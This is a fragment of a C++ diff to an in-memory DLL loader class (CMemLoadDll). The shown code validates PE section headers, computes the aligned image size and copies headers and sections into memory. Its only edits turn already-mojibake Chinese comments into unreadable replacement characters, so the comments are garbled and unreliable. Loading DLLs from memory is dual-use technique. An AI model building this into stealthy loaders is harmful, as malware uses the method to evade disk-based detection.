 		return FALSE;
 	}
@@ -384,9 +395,9 @@ BOOL CMemLoadDll::CheckDataValide(void* lpFileData, int nDataLength)
 		return FALSE;
 	}	
 	
-	//È¡µÃ½Ú±í£¨¶Î±í£©
+	//È¡ï¿½Ã½Ú±ï¿½ï¿½ï¿½ï¿½Î±ï¿½ï¿½ï¿½
 	m_pSectionHeader = (PIMAGE_SECTION_HEADER)((PBYTE)m_pNTHeader + sizeof(IMAGE_NT_HEADERS));
-	//ÑéÖ¤Ã¿¸ö½Ú±íµÄ¿Õ¼ä
+	//ï¿½ï¿½Ö¤Ã¿ï¿½ï¿½ï¿½Ú±ï¿½ï¿½Ä¿Õ¼ï¿½
 	for (int i=0; i< m_pNTHeader->FileHeader.NumberOfSections; i++)
 	{
 		if ((m_pSectionHeader[i].PointerToRawData + m_pSectionHeader[i].SizeOfRawData) > (DWORD)nDataLength)
@@ -398,13 +409,13 @@ BOOL CMemLoadDll::CheckDataValide(void* lpFileData, int nDataLength)
 	return TRUE;
 }
 
-//¼ÆËã¶ÔÆë±ß½ç
+//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ß½ï¿½
 int CMemLoadDll::GetAlignedSize(int nOrigin, int nAlignment)
 {
 	return (nOrigin + nAlignment - 1) / nAlignment * nAlignment;
 }
 
-//¼ÆËãÕû¸ödllÓ³ÏñÎÄ¼þµÄ³ß´ç
+//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½dllÓ³ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½Ä³ß´ï¿½
 int CMemLoadDll::CalcTotalImageSize()
 {
 	int nSize = 0;
@@ -414,14 +425,14 @@ int CMemLoadDll::CalcTotalImageSize()
 		return 0;
 	}
 
-	int nAlign = m_pNTHeader->OptionalHeader.SectionAlignment; //¶Î¶ÔÆë×Ö½ÚÊý
+	int nAlign = m_pNTHeader->OptionalHeader.SectionAlignment; //ï¿½Î¶ï¿½ï¿½ï¿½ï¿½Ö½ï¿½ï¿½ï¿½
 	
-	// ¼ÆËãËùÓÐÍ·µÄ³ß´ç¡£°üÀ¨dos, coff, peÍ· ºÍ ¶Î±íµÄ´óÐ¡
+	// ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Í·ï¿½Ä³ß´ç¡£ï¿½ï¿½ï¿½ï¿½dos, coff, peÍ· ï¿½ï¿½ ï¿½Î±ï¿½ï¿½Ä´ï¿½Ð¡
 	nSize = GetAlignedSize(m_pNTHeader->OptionalHeader.SizeOfHeaders, nAlign);
-	// ¼ÆËãËùÓÐ½ÚµÄ´óÐ¡
+	// ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ð½ÚµÄ´ï¿½Ð¡
 	for (int i=0; i < m_pNTHeader->FileHeader.NumberOfSections; ++i)
 	{
-		//µÃµ½¸Ã½ÚµÄ´óÐ¡
+		//ï¿½Ãµï¿½ï¿½Ã½ÚµÄ´ï¿½Ð¡
 		int nCodeSize = m_pSectionHeader[i].Misc.VirtualSize ;
 		int nLoadSize = m_pSectionHeader[i].SizeOfRawData;
 		int nMaxSize = (nLoadSize > nCodeSize) ? (nLoadSize) : (nCodeSize);
@@ -436,37 +447,37 @@ int CMemLoadDll::CalcTotalImageSize()
 	return nSize;
 }
 
-//CopyDllDatasº¯Êý½«dllÊý¾Ý¸´ÖÆµ½Ö¸¶¨ÄÚ´æÇøÓò£¬²¢¶ÔÆëËùÓÐ½Ú
-//pSrc: ´æ·ÅdllÊý¾ÝµÄÔ­Ê¼»º³åÇø
-//pDest:Ä¿±êÄÚ´æµØÖ·
+//CopyDllDatasï¿½ï¿½ï¿½ï¿½ï¿½ï¿½dllï¿½ï¿½ï¿½Ý¸ï¿½ï¿½Æµï¿½Ö¸ï¿½ï¿½ï¿½Ú´ï¿½ï¿½ï¿½ï¿½ò£¬²ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ð½ï¿½
+//pSrc: ï¿½ï¿½ï¿½dllï¿½ï¿½ï¿½Ýµï¿½Ô­Ê¼ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
+//pDest:Ä¿ï¿½ï¿½ï¿½Ú´ï¿½ï¿½Ö·
 void CMemLoadDll::CopyDllDatas(void* pDest, void* pSrc)
 {
-	// ¼ÆËãÐèÒª¸´ÖÆµÄPEÍ·+¶Î±í×Ö½ÚÊý
+	// ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Òªï¿½ï¿½ï¿½Æµï¿½PEÍ·+ï¿½Î±ï¿½ï¿½Ö½ï¿½ï¿½ï¿½
 	int  nHeaderSize = m_pNTHeader->OptionalHeader.SizeOfHeaders;
 	int  nSectionSize = m_pNTHeader->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER);
 	int  nMoveSize = nHeaderSize + nSectionSize;
-	//¸´ÖÆÍ·ºÍ¶ÎÐÅÏ¢
+	//ï¿½ï¿½ï¿½ï¿½Í·ï¿½Í¶ï¿½ï¿½ï¿½Ï¢
 	memcpy(pDest, pSrc, nMoveSize);
 	
-	//¸´ÖÆÃ¿¸ö½Ú
+	//ï¿½ï¿½ï¿½ï¿½Ã¿ï¿½ï¿½ï¿½ï¿½
 	for (int i=0; i < m_pNTHeader->FileHeader.NumberOfSections; ++i)
 	{
 		if (m_pSectionHeader[i].VirtualAddress == 0 || m_pSectionHeader[i].SizeOfRawData == 0)
 		{
 			continue;
 		}
-		// ¶¨Î»¸Ã½ÚÔÚÄÚ´æÖÐµÄÎ»ÖÃ
+		// ï¿½ï¿½Î»ï¿½Ã½ï¿½ï¿½ï¿½ï¿½Ú´ï¿½ï¿½Ðµï¿½Î»ï¿½ï¿½
 		void *pSectionAddress = (void *)((PBYTE)pDest + m_pSectionHeader[i].VirtualAddress);
-		// ¸´ÖÆ¶ÎÊý¾Ýµ½ÐéÄâÄÚ´æ
+		// ï¿½ï¿½ï¿½Æ¶ï¿½ï¿½ï¿½ï¿½Ýµï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ú´ï¿½
 		memcpy((void *)pSectionAddress, (void *)((PBYTE)pSrc + m_pSectionHeader[i].PointerToRawData),
 			m_pSectionHeader[i].SizeOfRawData);
 	}
 	
-	//ÐÞÕýÖ¸Õë£¬Ö¸ÏòÐÂ·ÖÅäµÄÄÚ´æ
-	//ÐÂµÄdosÍ·
+	//ï¿½ï¿½ï¿½ï¿½Ö¸ï¿½ë£¬Ö¸ï¿½ï¿½ï¿½Â·ï¿½ï¿½ï¿½ï¿½ï¿½Ú´ï¿½
+	//ï¿½Âµï¿½dosÍ·
 	m_pDosHeader = (PIMAGE_DOS_HEADER)pDest;
-	//ÐÂµÄpeÍ·µØÖ·
+	//ï¿½Âµï¿½peÍ·ï¿½ï¿½Ö·
 	m_pNTHeader = (PIMAGE_NT_HEADERS)((PBYTE)pDest + (m_pDosHeader->e_lfanew));
-	//ÐÂµÄ½Ú±íµØÖ·
+	//ï¿½ÂµÄ½Ú±ï¿½ï¿½ï¿½Ö·
 	m_pSectionHeader = (PIMAGE_SECTION_HEADER)((PBYTE)m_pNTHeader + sizeof(IMAGE_NT_HEADERS));
 }
